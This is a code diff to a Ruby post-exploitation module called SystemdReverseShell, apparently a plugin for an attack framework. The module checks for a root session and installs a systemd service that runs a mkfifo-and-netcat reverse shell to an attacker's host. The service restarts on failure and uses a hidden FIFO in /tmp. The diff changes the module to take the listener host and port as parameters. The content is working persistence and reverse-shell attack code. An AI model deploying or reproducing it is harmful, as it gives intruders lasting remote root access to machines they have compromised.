@@ -1,5 +1,5 @@
 module SystemdReverseShell
-  def self.run(fm, sid, client)
+  def self.run(fm, sid, client,lhost,lport)
     session = fm.sessions[sid]
     return unless session
 
@@ -19,9 +19,6 @@ module SystemdReverseShell
 
     client.print_good("Session #{sid} is root. Deploying systemd reverse shell...")
 
-    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
-    attacker_port = 4444
-
     # Evitar duplicação
     if session.shell_command_token("systemctl list-unit-files | grep -q '^#{service_name}' && echo 'EXISTS'").include?('EXISTS')
       client.print_status("Systemd service already exists. Skipping.")
@@ -35,7 +32,7 @@ module SystemdReverseShell
 
       [Service]
       Type=simple
-      ExecStart=/bin/bash -c 'rm -f /tmp/.s; mkfifo /tmp/.s; /bin/sh -i < /tmp/.s 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.s'
+      ExecStart=/bin/bash -c 'rm -f /tmp/.s; mkfifo /tmp/.s; /bin/sh -i < /tmp/.s 2>&1 | nc #{lhost} #{lport} > /tmp/.s'
       Restart=on-failure
       RestartSec=10
 
